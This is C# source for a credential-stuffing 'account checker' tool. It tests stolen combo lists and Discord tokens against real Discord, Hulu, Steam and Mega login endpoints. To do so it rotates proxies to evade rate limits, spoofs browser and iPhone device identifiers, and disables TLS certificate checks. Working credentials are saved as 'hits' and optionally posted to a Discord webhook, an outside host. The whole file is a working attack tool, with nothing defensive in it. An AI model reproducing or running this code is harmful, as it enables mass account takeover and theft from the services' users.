using System.Collections.Concurrent;
using System.Net;
using System.Net.Http.Json;
using System.Security.Authentication;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using CG.Web.MegaApiClient;
using SteamKit2;

namespace FishTools.App;

internal sealed class AccountChecker : ITool
{
    public string Id => "account-checker";
    public string Name => "Account Checker";
    public string Category => ToolCategories.Automation;
    public string Description => "High-speed multi-threaded account checker (Discord, Hulu, Steam, Mega).";

    public async Task RunAsync(ToolContext context)
    {
        ServicePointManager.DefaultConnectionLimit = 1000;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

        while (true)
        {
            ConsoleUi.ResetScreen(Name);
            var choice = ConsoleUi.ShowMenu("Choose a service to check", ["Discord (Token)", "Hulu (Email:Pass)", "Steam (User:Pass)", "Mega (Email:Pass)", "Back"]);

            if (choice == 4)
                break;

            var combosPath = ConsoleUi.PromptRequired("Path to combos file");
            if (!File.Exists(combosPath))
            {
                ConsoleUi.Error("File not found.");
                ConsoleUi.Pause();
                continue;
            }

            var webhook = ConsoleUi.Prompt("Discord Webhook (optional)");
            var threads = ConsoleUi.PromptInt("Threads (Max speed)", 10, 1, 100);

            var useProxies = ConsoleUi.Confirm("Use proxies?");
            List<string> proxies = [];
            if (useProxies)
            {
                var proxyPath = ConsoleUi.PromptRequired("Path to proxy list");
                if (File.Exists(proxyPath))
                    proxies = File.ReadAllLines(proxyPath).Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
            }

            var runner = new CheckerRunner(
                choice switch
                {
                    0 => "Discord",
                    1 => "Hulu",
                    2 => "Steam",
                    3 => "Mega",
                    _ => "",
                },
                webhook,
                proxies,
                threads,
                context
            );

            await runner.RunAsync(combosPath);
            ConsoleUi.Pause();
        }
    }

    private class CheckerRunner(string service, string? webhook, List<string> proxies, int threads, ToolContext context)
    {
        private readonly string _service = service;
        private readonly string? _webhook = webhook;
        private readonly List<string> _proxies = proxies;
        private readonly int _threads = threads;
        private readonly ToolContext _context = context;
        private int _processed,
            _hits,
            _bads,
            _errors;
        private DateTime _startTime;

        private static readonly Options MegaOptions = new(
            computeApiRequestRetryWaitDelay: (int attempt, out TimeSpan delay) =>
            {
                delay = TimeSpan.Zero;
                return attempt <= 1;
            }
        );
        private readonly ConcurrentBag<HttpClient> _httpPool = [];

        public async Task RunAsync(string filePath)
        {
            var lines = File.ReadAllLines(filePath).Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
            var total = lines.Count;
            _startTime = DateTime.Now;

            ConsoleUi.Info($"Starting {_service} check with {_threads} threads...");

            var resultsDir = Path.Combine(_context.Paths.ResultsDirectory, _service);
            Directory.CreateDirectory(resultsDir);
            var hitsPath = Path.Combine(resultsDir, "hits.txt");

            var parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = _threads };
            await Parallel.ForEachAsync(
                lines,
                parallelOptions,
                async (line, ct) =>
                {
                    try
                    {
                        var current = Interlocked.Increment(ref _processed);
                        if (current % 10 == 0)
                            ConsoleUi.Info($"[{current}/{total}] Checking {_service}: {line}");

                        var result = await CheckOne(line);

                        if (result.Success)
                        {
                            Interlocked.Increment(ref _hits);
                            lock (hitsPath)
                                File.AppendAllText(hitsPath, $"{line} | {result.Details}{Environment.NewLine}");
                            ConsoleUi.Success($"[HIT] {line} | {result.Details}");
                            if (!string.IsNullOrEmpty(_webhook))
                                await SendWebhook(line, result.Details ?? "");
                        }
                        else
                        {
                            Interlocked.Increment(ref _bads);
                        }
                    }
                    catch (Exception ex)
                    {
                        Interlocked.Increment(ref _errors);
                    }
                    finally
                    {
                        UpdateTitle(total);
                    }
                }
            );

            ConsoleUi.Success($"--- {_service} COMPLETED ---");
            ConsoleUi.Info($"Hits: {_hits} | Bads: {_bads} | Errors: {_errors} | Total: {total}");
        }

        private void UpdateTitle(int total)
        {
            var elapsed = DateTime.Now - _startTime;
            var rate = _processed > 0 ? _processed / elapsed.TotalSeconds : 0;
            var remaining = rate > 0 ? (total - _processed) / rate : 0;
            Console.Title = $"Fish Tools | {_service} | {_processed}/{total} | Hits: {_hits} | {rate:F1} c/s | ETA: {TimeSpan.FromSeconds(remaining):mm\\:ss}";
        }

        private async Task<CheckResult> CheckOne(string line)
        {
            return _service switch
            {
                "Discord" => await CheckDiscord(line),
                "Hulu" => await CheckHulu(line),
                "Steam" => await CheckSteam(line),
                "Mega" => await CheckMega(line),
                _ => new CheckResult { Success = false },
            };
        }

        private HttpClient GetClient()
        {
            if (_httpPool.TryTake(out var existing))
                return existing;

            var handler = new HttpClientHandler
            {
                UseProxy = _proxies.Count > 0,
                Proxy = _proxies.Count > 0 ? new WebProxy(_proxies[Random.Shared.Next(_proxies.Count)]) : null,
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                ServerCertificateCustomValidationCallback = (m, c, ch, e) => true,
            };

            var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(60) };
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            client.DefaultRequestHeaders.ExpectContinue = false;
            return client;
        }

        private void ReleaseClient(HttpClient client) => _httpPool.Add(client);

        private async Task<CheckResult> CheckDiscord(string token)
        {
            var client = GetClient();
            try
            {
                client.DefaultRequestHeaders.Clear();
                client.DefaultRequestHeaders.Add("Authorization", token.Trim());
                var resp = await client.GetAsync("https://discord.com/api/v9/users/@me");
                if (resp.IsSuccessStatusCode)
                {
                    var user = await resp.Content.ReadFromJsonAsync<JsonElement>();
                    return new CheckResult { Success = true, Details = user.GetProperty("username").GetString() };
                }
                return new CheckResult { Success = false };
            }
            finally
            {
                ReleaseClient(client);
            }
        }

        private async Task<CheckResult> CheckHulu(string combo)
        {
            var parts = combo.Split(':', 2);
            if (parts.Length < 2)
                return new CheckResult { Success = false };
            var client = GetClient();
            try
            {
                var postData = $"affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={parts[1].Trim()}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={parts[0].Trim()}";
                var content = new StringContent(postData, Encoding.UTF8, "application/x-www-form-urlencoded");
                var resp = await client.PostAsync("https://auth.hulu.com/v1/device/password/authenticate", content);
                var body = await resp.Content.ReadAsStringAsync();
                return new CheckResult { Success = body.Contains("user_token"), Details = body.Contains("user_token") ? "Auth OK" : "Invalid" };
            }
            finally
            {
                ReleaseClient(client);
            }
        }

        private async Task<CheckResult> CheckSteam(string combo)
        {
            var parts = combo.Split(':', 2);
            if (parts.Length < 2)
                return new CheckResult { Success = false };
            var client = new SteamClient();
            var manager = new CallbackManager(client);
            var user = client.GetHandler<SteamUser>();
            bool done = false;
            CheckResult res = new() { Success = false };

            manager.Subscribe<SteamClient.ConnectedCallback>(c => user.LogOn(new SteamUser.LogOnDetails { Username = parts[0].Trim(), Password = parts[1].Trim() }));
            manager.Subscribe<SteamUser.LoggedOnCallback>(c =>
            {
                if (c.Result == EResult.OK)
                    res = new() { Success = true, Details = "OK" };
                else if (c.Result == EResult.AccountLogonDenied)
                    res = new() { Success = true, Details = "SteamGuard" };
                else
                    res = new() { Success = false, Details = c.Result.ToString() };
                done = true;
            });

            client.Connect();
            var timeout = DateTime.Now.AddSeconds(15);
            while (!done && DateTime.Now < timeout)
            {
                manager.RunWaitCallbacks(TimeSpan.FromMilliseconds(10));
                await Task.Delay(5);
            }
            client.Disconnect();
            return res;
        }

        private async Task<CheckResult> CheckMega(string combo)
        {
            var parts = combo.Split(':', 2);
            if (parts.Length < 2)
                return new CheckResult { Success = false };

            var httpClient = GetClient();
            try
            {
                var megaWebClient = new MegaWebClient(httpClient);
                var client = new MegaApiClient(MegaOptions, megaWebClient);
                await client.LoginAsync(parts[0].Trim(), parts[1].Trim());

                if (client.IsLoggedIn)
                {
                    var info = await client.GetAccountInformationAsync();
                    var used = info.UsedQuota / 1073741824.0;
                    var total = info.TotalQuota / 1073741824.0;
                    await client.LogoutAsync();
                    return new CheckResult { Success = true, Details = $"{used:F1}GB/{total:F1}GB" };
                }
            }
            catch (ApiException ex) when (ex.ApiResultCode == ApiResultCode.BadArguments || ex.ApiResultCode == ApiResultCode.RequestIncomplete)
            {
                return new CheckResult { Success = false };
            }
            catch
            {
                return new CheckResult { Success = false };
            }
            finally
            {
                ReleaseClient(httpClient);
            }
            return new CheckResult { Success = false };
        }

        private async Task SendWebhook(string item, string details)
        {
            try
            {
                using var c = new HttpClient();
                await c.PostAsJsonAsync(_webhook!, new { content = $"**{_service} Hit!**\n`{item}`\nDetails: {details}" });
            }
            catch { }
        }

        private struct CheckResult
        {
            public bool Success;
            public string? Details;
        }

        private class MegaWebClient(HttpClient httpClient) : IWebClient
        {
            private readonly HttpClient _httpClient = httpClient;
            public int BufferSize { get; set; } = 65536;

            public string PostRequestJson(Uri url, string jsonData) => PostRequestJson(url, jsonData, null!);

            public string PostRequestJson(Uri url, string jsonData, string hashcash)
            {
                using var request = new HttpRequestMessage(HttpMethod.Post, url);
                request.Content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                if (!string.IsNullOrEmpty(hashcash))
                    request.Headers.Add("X-Hashcash", hashcash);

                using var response = _httpClient.SendAsync(request, HttpCompletionOption.ResponseContentRead).GetAwaiter().GetResult();
                return response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
            }

            public string PostRequestRaw(Uri url, Stream dataStream)
            {
                using var request = new HttpRequestMessage(HttpMethod.Post, url);
                request.Content = new StreamContent(dataStream);
                using var response = _httpClient.SendAsync(request, HttpCompletionOption.ResponseContentRead).GetAwaiter().GetResult();
                return response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
            }

            public Stream PostRequestRawAsStream(Uri url, Stream dataStream)
            {
                using var request = new HttpRequestMessage(HttpMethod.Post, url);
                request.Content = new StreamContent(dataStream);
                var response = _httpClient.SendAsync(request, HttpCompletionOption.ResponseContentRead).GetAwaiter().GetResult();
                return response.Content.ReadAsStreamAsync().GetAwaiter().GetResult();
            }

            public Stream GetRequestRaw(Uri url) => _httpClient.GetStreamAsync(url).GetAwaiter().GetResult();
        }
    }
}
